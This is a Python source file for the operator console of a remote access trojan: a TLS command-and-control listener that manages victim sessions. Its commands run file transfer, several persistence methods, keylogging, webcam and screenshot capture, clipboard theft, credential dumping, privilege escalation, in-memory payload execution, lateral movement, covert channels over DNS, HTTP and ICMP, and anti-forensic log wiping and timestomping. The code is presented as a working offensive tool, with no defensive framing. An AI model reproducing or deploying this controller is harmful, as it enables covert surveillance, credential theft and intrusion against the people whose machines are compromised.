import socket
import threading
import sys
import ssl
import os
import base64
import datetime

sessions = {}
session_lock = threading.Lock()

# Shared secret for authentication
SHARED_SECRET = "SuperSecretToken123"

LOG_FILE = f"listener_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
def log_event(event):
    with open(LOG_FILE, 'a') as log:
        log.write(f"[{datetime.datetime.now().isoformat()}] {event}\n")

class ClientSession(threading.Thread):
    def __init__(self, conn, addr, session_id):
        super().__init__(daemon=True)
        self.conn = conn
        self.addr = addr
        self.session_id = session_id
        self.active = True
        self.buffer = b''

    def run(self):
        while self.active:
            try:
                data = self.conn.recv(4096)
                if not data:
                    break
                with session_lock:
                    self.buffer += data
            except Exception:
                break
        self.active = False
        self.conn.close()
        with session_lock:
            del sessions[self.session_id]

    def send(self, cmd):
        try:
            encoded = base64.b64encode(cmd.encode())
            self.conn.send(encoded)
        except Exception:
            self.active = False

    def recv(self):
        with session_lock:
            output = self.buffer
            self.buffer = b''
        if output:
            try:
                return base64.b64decode(output).decode(errors='ignore')
            except Exception:
                return output.decode(errors='ignore')
        return ''


def start_listener(listen_ip, listen_port):
    # SSL context setup
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="server.pem", keyfile="server.key")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((listen_ip, listen_port))
    s.listen(5)
    print(f"[+] Listening on {listen_ip}:{listen_port} (SSL/TLS enabled)...")

    def accept_clients():
        session_id = 1
        while True:
            conn, addr = s.accept()
            log_event(f"Connection attempt from {addr[0]}:{addr[1]}")
            try:
                ssl_conn = context.wrap_socket(conn, server_side=True)
                # Authenticate client
                token = ssl_conn.recv(1024).decode().strip()
                if token != SHARED_SECRET:
                    log_event(f"Authentication failed from {addr[0]}:{addr[1]}")
                    print(f"[!] Authentication failed from {addr[0]}:{addr[1]}")
                    ssl_conn.close()
                    continue
                log_event(f"Authenticated connection from {addr[0]}:{addr[1]} (Session {session_id})")
                print(f"[+] Authenticated SSL connection from {addr[0]}:{addr[1]} (Session {session_id})")
                client = ClientSession(ssl_conn, addr, session_id)
                with session_lock:
                    sessions[session_id] = client
                client.start()
                session_id += 1
            except ssl.SSLError as e:
                log_event(f"SSL error from {addr[0]}:{addr[1]}: {e}")
                print(f"[!] SSL error: {e}")
                conn.close()

    threading.Thread(target=accept_clients, daemon=True).start()

    selected_session = None
    while True:
        cmd = input("MultiShell> ").strip()
        if cmd == "help":
            print("Commands:\n  list                List active sessions\n  select <id>         Interact with a session\n  exit                Exit the listener\n  help                Show this help message")
        elif cmd == "list":
            with session_lock:
                if not sessions:
                    print("No active sessions.")
                else:
                    for sid, sess in sessions.items():
                        status = "active" if sess.active else "closed"
                        print(f"Session {sid}: {sess.addr[0]}:{sess.addr[1]} [{status}]")
        elif cmd.startswith("select "):
            try:
                sid = int(cmd.split()[1])
                with session_lock:
                    if sid not in sessions or not sessions[sid].active:
                        print("Invalid or closed session.")
                        continue
                    selected_session = sessions[sid]
                print(f"[+] Interacting with Session {sid} ({selected_session.addr[0]}:{selected_session.addr[1]})")
                while selected_session.active:
                    shell_cmd = input(f"Session {sid} Shell> ")
                    if shell_cmd.strip() == '':
                        continue
                    log_event(f"Command sent to Session {sid}: {shell_cmd}")
                    if shell_cmd.lower() == 'exit':
                        selected_session.send('exit')
                        break
                    # For file upload/download, encode/decode file data as base64 as well
                    elif shell_cmd.startswith('upload '):
                        try:
                            _, local_path, remote_path = shell_cmd.split(maxsplit=2)
                            if not os.path.isfile(local_path):
                                print(f"[!] Local file not found: {local_path}")
                                continue
                            selected_session.send(f'upload {remote_path}')
                            with open(local_path, 'rb') as f:
                                data = f.read()
                            b64data = base64.b64encode(data)
                            selected_session.conn.sendall(len(b64data).to_bytes(8, 'big'))
                            selected_session.conn.sendall(b64data)
                            resp = selected_session.conn.recv(1024)
                            print(base64.b64decode(resp).decode(errors='ignore'))
                        except Exception as e:
                            print(f"[!] Upload error: {e}")
                    elif shell_cmd.startswith('download '):
                        try:
                            _, remote_path, local_path = shell_cmd.split(maxsplit=2)
                            selected_session.send(f'download {remote_path}')
                            size_bytes = selected_session.conn.recv(8)
                            size = int.from_bytes(size_bytes, 'big')
                            if size == 0:
                                print(f"[!] Remote file not found: {remote_path}")
                                continue
                            b64data = b''
                            while len(b64data) < size:
                                chunk = selected_session.conn.recv(min(4096, size - len(b64data)))
                                if not chunk:
                                    break
                                b64data += chunk
                            data = base64.b64decode(b64data)
                            with open(local_path, 'wb') as f:
                                f.write(data)
                            print(f"[+] Downloaded to {local_path} ({len(data)} bytes)")
                        except Exception as e:
                            print(f"[!] Download error: {e}")
                    # Persistence
                    elif shell_cmd.lower() == 'persist':
                        selected_session.send('persist')
                        resp = selected_session.conn.recv(1024).decode()
                        print(resp)
                    # Persistence variants & fileless persistence
                    elif shell_cmd == 'persist_task':
                        selected_session.send('persist_task')
                        resp = selected_session.conn.recv(65536)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Persistence (Task/systemd) ---\n{msg}\n----------------------------------\n')
                        except Exception as e:
                            print(f"[!] Persist task error: {e}")
                    elif shell_cmd == 'persist_wmi':
                        selected_session.send('persist_wmi')
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Persistence (WMI) ---\n{msg}\n-------------------------\n')
                        except Exception as e:
                            print(f"[!] Persist WMI error: {e}")
                    elif shell_cmd == 'persist_fileless':
                        selected_session.send('persist_fileless')
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Persistence (Fileless) ---\n{msg}\n------------------------------\n')
                        except Exception as e:
                            print(f"[!] Persist fileless error: {e}")
                    elif shell_cmd == 'persist_status':
                        selected_session.send('persist_status')
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Persistence Status ---\n{msg}\n--------------------------\n')
                        except Exception as e:
                            print(f"[!] Persist status error: {e}")
                    # Screenshot capture
                    elif shell_cmd.startswith('screenshot '):
                        try:
                            _, remote_path, local_path = shell_cmd.split(maxsplit=2)
                            selected_session.send(f'screenshot {remote_path}')
                            size_bytes = selected_session.conn.recv(8)
                            size = int.from_bytes(size_bytes, 'big')
                            if size == 0:
                                print(f"[!] Screenshot failed or not supported on client.")
                                continue
                            b64data = b''
                            while len(b64data) < size:
                                chunk = selected_session.conn.recv(min(4096, size - len(b64data)))
                                if not chunk:
                                    break
                                b64data += chunk
                            data = base64.b64decode(b64data)
                            with open(local_path, 'wb') as f:
                                f.write(data)
                            print(f"[+] Screenshot saved to {local_path} ({len(data)} bytes)")
                        except Exception as e:
                            print(f"[!] Screenshot error: {e}")
                    # Keylogger commands
                    elif shell_cmd == 'keylog_start':
                        selected_session.send('keylog_start')
                        resp = selected_session.conn.recv(1024)
                        print(base64.b64decode(resp).decode(errors='ignore'))
                    elif shell_cmd == 'keylog_stop':
                        selected_session.send('keylog_stop')
                        resp = selected_session.conn.recv(1024)
                        print(base64.b64decode(resp).decode(errors='ignore'))
                    elif shell_cmd.startswith('keylog_dump '):
                        try:
                            _, local_path = shell_cmd.split(maxsplit=1)
                            selected_session.send('keylog_dump')
                            size_bytes = selected_session.conn.recv(8)
                            size = int.from_bytes(size_bytes, 'big')
                            if size == 0:
                                print(f"[!] No keylog data available.")
                                continue
                            b64data = b''
                            while len(b64data) < size:
                                chunk = selected_session.conn.recv(min(4096, size - len(b64data)))
                                if not chunk:
                                    break
                                b64data += chunk
                            data = base64.b64decode(b64data)
                            with open(local_path, 'wb') as f:
                                f.write(data)
                            print(f"[+] Keylog saved to {local_path} ({len(data)} bytes)")
                        except Exception as e:
                            print(f"[!] Keylog dump error: {e}")
                    # Webcam snapshot
                    elif shell_cmd.startswith('webcam '):
                        try:
                            _, remote_path, local_path = shell_cmd.split(maxsplit=2)
                            selected_session.send(f'webcam {remote_path}')
                            size_bytes = selected_session.conn.recv(8)
                            size = int.from_bytes(size_bytes, 'big')
                            if size == 0:
                                print(f"[!] Webcam capture failed or not supported on client.")
                                continue
                            b64data = b''
                            while len(b64data) < size:
                                chunk = selected_session.conn.recv(min(4096, size - len(b64data)))
                                if not chunk:
                                    break
                                b64data += chunk
                            data = base64.b64decode(b64data)
                            with open(local_path, 'wb') as f:
                                f.write(data)
                            print(f"[+] Webcam snapshot saved to {local_path} ({len(data)} bytes)")
                        except Exception as e:
                            print(f"[!] Webcam error: {e}")
                    # Clipboard stealer
                    elif shell_cmd == 'clipboard':
                        selected_session.send('clipboard')
                        size_bytes = selected_session.conn.recv(8)
                        size = int.from_bytes(size_bytes, 'big')
                        if size == 0:
                            print(f"[!] Clipboard access failed or clipboard is empty.")
                        else:
                            b64data = b''
                            while len(b64data) < size:
                                chunk = selected_session.conn.recv(min(4096, size - len(b64data)))
                                if not chunk:
                                    break
                                b64data += chunk
                            data = base64.b64decode(b64data)
                            print(f"[+] Clipboard contents:\n{data.decode(errors='ignore')}")
                    # Continuous clipboard monitoring
                    elif shell_cmd.startswith('clipboard_monitor'):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(65536)
                        import base64
                        if 'dump' in shell_cmd:
                            try:
                                data = base64.b64decode(resp)
                                print(f'\n--- Clipboard Monitor Log ---\n{data.decode(errors="ignore")}\n-----------------------------\n')
                            except Exception as e:
                                print(f"[!] Clipboard monitor dump error: {e}")
                        else:
                            try:
                                msg = base64.b64decode(resp).decode(errors='ignore')
                                print(f'\n--- Clipboard Monitor ---\n{msg}\n------------------------\n')
                            except Exception as e:
                                print(f"[!] Clipboard monitor error: {e}")
                    # Network info
                    elif shell_cmd == 'netinfo':
                        selected_session.send('netinfo')
                        resp = selected_session.conn.recv(65536)
                        import base64, json
                        try:
                            netinfo = base64.b64decode(resp).decode(errors='ignore')
                            try:
                                info = json.loads(netinfo)
                                print('\n--- Network Information ---')
                                print(f"Hostname: {info.get('hostname')}")
                                print(f"Platform: {info.get('platform')}")
                                print(f"Local IPs: {info.get('local_ips')}")
                                print(f"\nRouting Table:\n{info.get('routing_table')}")
                                print(f"\nOpen Ports:\n{info.get('open_ports')}")
                                print('--------------------------\n')
                            except Exception:
                                print(netinfo)
                        except Exception as e:
                            print(f"[!] Netinfo error: {e}")
                    # System info
                    elif shell_cmd == 'sysinfo':
                        selected_session.send('sysinfo')
                        resp = selected_session.conn.recv(65536)
                        import base64, json
                        try:
                            sysinfo = base64.b64decode(resp).decode(errors='ignore')
                            try:
                                info = json.loads(sysinfo)
                                print('\n--- System Information ---')
                                for k, v in info.items():
                                    print(f"{k}: {v}")
                                print('--------------------------\n')
                            except Exception:
                                print(sysinfo)
                        except Exception as e:
                            print(f"[!] Sysinfo error: {e}")
                    # User enumeration
                    elif shell_cmd == 'users':
                        selected_session.send('users')
                        resp = selected_session.conn.recv(65536)
                        import base64, json
                        try:
                            users = base64.b64decode(resp).decode(errors='ignore')
                            try:
                                info = json.loads(users)
                                print('\n--- User Information ---')
                                for k, v in info.items():
                                    print(f"{k}: {v}")
                                print('--------------------------\n')
                            except Exception:
                                print(users)
                        except Exception as e:
                            print(f"[!] Users error: {e}")
                    # Process listing
                    elif shell_cmd == 'ps':
                        selected_session.send('ps')
                        resp = selected_session.conn.recv(65536)
                        import base64
                        try:
                            ps = base64.b64decode(resp).decode(errors='ignore')
                            print('\n--- Process List ---')
                            print(ps)
                            print('--------------------\n')
                        except Exception as e:
                            print(f"[!] PS error: {e}")
                    # Directory listing
                    elif shell_cmd.startswith('ls '):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(65536)
                        import base64, json
                        try:
                            ls = base64.b64decode(resp).decode(errors='ignore')
                            try:
                                files = json.loads(ls)
                                print('\n--- Directory Listing ---')
                                for f in files:
                                    print(f)
                                print('-------------------------\n')
                            except Exception:
                                print(ls)
                        except Exception as e:
                            print(f"[!] LS error: {e}")
                    # Find files
                    elif shell_cmd.startswith('find '):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(65536)
                        import base64, json
                        try:
                            found = base64.b64decode(resp).decode(errors='ignore')
                            try:
                                matches = json.loads(found)
                                print('\n--- Find Results ---')
                                for m in matches:
                                    print(m)
                                print('--------------------\n')
                            except Exception:
                                print(found)
                        except Exception as e:
                            print(f"[!] Find error: {e}")
                    # Scheduled tasks
                    elif shell_cmd == 'tasks':
                        selected_session.send('tasks')
                        resp = selected_session.conn.recv(65536)
                        import base64
                        try:
                            tasks = base64.b64decode(resp).decode(errors='ignore')
                            print('\n--- Scheduled Tasks ---')
                            print(tasks)
                            print('-----------------------\n')
                        except Exception as e:
                            print(f"[!] Tasks error: {e}")
                    # Services
                    elif shell_cmd == 'services':
                        selected_session.send('services')
                        resp = selected_session.conn.recv(65536)
                        import base64
                        try:
                            services = base64.b64decode(resp).decode(errors='ignore')
                            print('\n--- Services ---')
                            print(services)
                            print('----------------\n')
                        except Exception as e:
                            print(f"[!] Services error: {e}")
                    # Antivirus
                    elif shell_cmd == 'av':
                        selected_session.send('av')
                        resp = selected_session.conn.recv(65536)
                        import base64
                        try:
                            av = base64.b64decode(resp).decode(errors='ignore')
                            print('\n--- Antivirus ---')
                            print(av)
                            print('----------------\n')
                        except Exception as e:
                            print(f"[!] AV error: {e}")
                    # Netstat
                    elif shell_cmd == 'netstat':
                        selected_session.send('netstat')
                        resp = selected_session.conn.recv(65536)
                        import base64
                        try:
                            netstat = base64.b64decode(resp).decode(errors='ignore')
                            print('\n--- Netstat ---')
                            print(netstat)
                            print('----------------\n')
                        except Exception as e:
                            print(f"[!] Netstat error: {e}")
                    # Recent files/history
                    elif shell_cmd == 'recent':
                        selected_session.send('recent')
                        resp = selected_session.conn.recv(65536)
                        import base64, json
                        try:
                            recent = base64.b64decode(resp).decode(errors='ignore')
                            try:
                                info = json.loads(recent)
                                print('\n--- Recent Files/History ---')
                                for k, v in info.items():
                                    print(f"{k}: {v}")
                                print('----------------------------\n')
                            except Exception:
                                print(recent)
                        except Exception as e:
                            print(f"[!] Recent error: {e}")
                    # Self-destruct
                    elif shell_cmd == 'selfdestruct':
                        selected_session.send('selfdestruct')
                        resp = selected_session.conn.recv(1024)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Self-Destruct ---\n{msg}\n---------------------\n')
                        except Exception as e:
                            print(f"[!] Self-destruct error: {e}")
                    # Privilege escalation
                    elif shell_cmd == 'elevate':
                        selected_session.send('elevate')
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Privilege Escalation ---\n{msg}\n----------------------------\n')
                        except Exception as e:
                            print(f"[!] Elevate error: {e}")
                    # In-memory payload execution
                    elif shell_cmd.startswith('execmem '):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(65536)
                        import base64
                        try:
                            result = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- In-Memory Execution ---\n{result}\n---------------------------\n')
                        except Exception as e:
                            print(f"[!] Execmem error: {e}")
                    # Command output streaming
                    elif shell_cmd.startswith('stream '):
                        selected_session.send(shell_cmd)
                        import base64
                        print('\n--- Streaming Output ---')
                        while True:
                            chunk = b''
                            while not chunk.endswith(b'\nSTREAMSEP\n') and not chunk.endswith(b'\nSTREAMEND\n'):
                                part = selected_session.conn.recv(4096)
                                if not part:
                                    break
                                chunk += part
                            if chunk.endswith(b'\nSTREAMEND\n'):
                                output = chunk[:-12]
                                if output:
                                    print(base64.b64decode(output).decode(errors='ignore'), end='')
                                print('\n--- Stream End ---\n')
                                break
                            else:
                                output = chunk[:-11]
                                print(base64.b64decode(output).decode(errors='ignore'), end='')
                    # Interactive TTY/PTY upgrade
                    elif shell_cmd == 'upgrade_pty':
                        import base64, sys
                        import threading
                        import select
                        import termios
                        import tty
                        selected_session.send('upgrade_pty')
                        print('\n--- PTY Upgrade ---')
                        old_settings = termios.tcgetattr(sys.stdin)
                        try:
                            tty.setraw(sys.stdin.fileno())
                            while True:
                                r, _, _ = select.select([selected_session.conn, sys.stdin], [], [])
                                if selected_session.conn in r:
                                    chunk = b''
                                    while not chunk.endswith(b'\nPTYSEP\n') and not chunk.endswith(b'\nPTYEND\n'):
                                        part = selected_session.conn.recv(1024)
                                        if not part:
                                            break
                                        chunk += part
                                    if chunk.endswith(b'\nPTYEND\n'):
                                        output = chunk[:-8]
                                        if output:
                                            print(base64.b64decode(output).decode(errors='ignore'), end='')
                                        print('\n--- PTY Session Ended ---\n')
                                        break
                                    else:
                                        output = chunk[:-8]
                                        print(base64.b64decode(output).decode(errors='ignore'), end='')
                                if sys.stdin in r:
                                    data = os.read(sys.stdin.fileno(), 1024)
                                    if not data:
                                        break
                                    selected_session.conn.send(base64.b64encode(data) + b'\nPTYSEP\n')
                        finally:
                            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
                    # Plugin/module system
                    elif shell_cmd == 'list_plugins':
                        selected_session.send('list_plugins')
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            plugins = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Plugins ---\n{plugins}\n---------------\n')
                        except Exception as e:
                            print(f"[!] List plugins error: {e}")
                    elif shell_cmd.startswith('load_plugin '):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Load Plugin ---\n{msg}\n-------------------\n')
                        except Exception as e:
                            print(f"[!] Load plugin error: {e}")
                    elif shell_cmd.startswith('run_plugin '):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(65536)
                        import base64
                        try:
                            result = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Run Plugin ---\n{result}\n------------------\n')
                        except Exception as e:
                            print(f"[!] Run plugin error: {e}")
                    # Reverse port forwarding
                    elif shell_cmd.startswith('rpfwd '):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Reverse Port Forward ---\n{msg}\n----------------------------\n')
                        except Exception as e:
                            print(f"[!] RPFWD error: {e}")
                    # SOCKS proxy
                    elif shell_cmd == 'socks':
                        selected_session.send('socks')
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- SOCKS Proxy ---\n{msg}\n-------------------\n')
                        except Exception as e:
                            print(f"[!] SOCKS error: {e}")
                    # Alternate C2 channels
                    elif shell_cmd.startswith('c2_http '):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- HTTP/S C2 ---\n{msg}\n-----------------\n')
                        except Exception as e:
                            print(f"[!] HTTP C2 error: {e}")
                    elif shell_cmd.startswith('c2_dns '):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- DNS C2 ---\n{msg}\n--------------\n')
                        except Exception as e:
                            print(f"[!] DNS C2 error: {e}")
                    elif shell_cmd.startswith('c2_icmp '):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- ICMP C2 ---\n{msg}\n---------------\n')
                        except Exception as e:
                            print(f"[!] ICMP C2 error: {e}")
                    # Automated lateral movement
                    elif shell_cmd.startswith('lateral_move'):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(65536)
                        import base64, json
                        try:
                            result = base64.b64decode(resp).decode(errors='ignore')
                            try:
                                info = json.loads(result)
                                print(f'\n--- Lateral Movement ---')
                                for k, v in info.items():
                                    print(f'{k}: {v}')
                                print('------------------------\n')
                            except Exception:
                                print(result)
                        except Exception as e:
                            print(f"[!] Lateral move error: {e}")
                    # Anti-forensics
                    elif shell_cmd == 'wipe_logs':
                        selected_session.send('wipe_logs')
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Wipe Logs ---\n{msg}\n-----------------\n')
                        except Exception as e:
                            print(f"[!] Wipe logs error: {e}")
                    elif shell_cmd.startswith('timestomp '):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Timestomp ---\n{msg}\n-----------------\n')
                        except Exception as e:
                            print(f"[!] Timestomp error: {e}")
                    elif shell_cmd.startswith('secure_erase '):
                        selected_session.send(shell_cmd)
                        resp = selected_session.conn.recv(4096)
                        import base64
                        try:
                            msg = base64.b64decode(resp).decode(errors='ignore')
                            print(f'\n--- Secure Erase ---\n{msg}\n--------------------\n')
                        except Exception as e:
                            print(f"[!] Secure erase error: {e}")
                    # Credential dumping
                    elif shell_cmd == 'creds_dump':
                        selected_session.send('creds_dump')
                        resp = selected_session.conn.recv(65536)
                        import base64, json
                        try:
                            result = base64.b64decode(resp).decode(errors='ignore')
                            try:
                                info = json.loads(result)
                                print(f'\n--- Credential Dump ---')
                                for k, v in info.items():
                                    print(f'{k}: {v}')
                                print('-----------------------\n')
                            except Exception:
                                print(result)
                        except Exception as e:
                            print(f"[!] Creds dump error: {e}")
                    else:
                        selected_session.send(shell_cmd)
                        threading.Event().wait(0.2)
                        output = selected_session.recv()
                        log_event(f"Output from Session {sid}: {output}")
                        print(output)
                print(f"[+] Session {sid} closed or exited.")
            except Exception as e:
                print(f"Error: {e}")
        elif cmd == "exit":
            print("Exiting listener.")
            break
        else:
            print("Unknown command. Type 'help' for options.")
    s.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <listen_ip> <listen_port>")
        sys.exit(1)
    start_listener(sys.argv[1], int(sys.argv[2])) 